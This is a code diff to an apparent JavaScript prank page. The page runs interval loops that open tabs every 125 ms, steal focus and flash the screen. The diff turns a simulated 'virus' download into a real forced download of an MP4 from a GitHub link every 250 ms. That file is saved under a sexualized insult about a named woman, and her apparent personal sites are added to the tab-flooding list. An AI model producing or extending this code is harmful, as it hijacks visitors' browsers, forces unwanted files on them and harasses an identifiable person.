@@ -78,24 +78,21 @@ function playErrorSound() {
 // Open random tabs
 function openRandomTabs() {
   const urls = [
-    "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
-    "https://pointerpointer.com/",
     "https://wietklapper.nl/",
-    "https://www.nyan.cat/",
     "https://tinekesieders.nl/",
     "https://leuk.tinekesieders.nl/",
-    "https://dans.tinekesieders.nl/"
+    "https://dans.tinekesieders.nl/",
+    "https://github.com/breadytoasted/gpt/raw/refs/heads/main/093e98f9-aa73-4c2c-b5cd-360a438e82c9.mp4"
   ];
   const url = urls[Math.floor(Math.random() * urls.length)];
   window.open(url, "_blank");
 }
 
-// Auto download (simulate)
+// Auto download
 function autoDownloadVirus() {
   const link = document.createElement('a');
-  link.href = 'data:text/plain,You got owned!';
-  link.download = 'virus.txt';
-  document.body.appendChild(link);
+  link.href = 'https://github.com/breadytoasted/gpt/raw/refs/heads/main/093e98f9-aa73-4c2c-b5cd-360a438e82c9.mp4';
+  link.download = 'tineke-is-een-milf.mp4'; //
   link.click();
   link.remove();
 }
@@ -239,8 +236,8 @@ function screamerJumpscare() {
 setInterval(glitchText, 500);
 setInterval(flashBackground, 300);
 setInterval(spawnError, 700);
-setInterval(playErrorSound, 250);
-setInterval(openRandomTabs, 50);
+setInterval(playErrorSound, 500);
+setInterval(openRandomTabs, 125);
 setInterval(autoDownloadVirus, 250);
 setInterval(stealFocus, 50);
 setInterval(windowResize, 750);
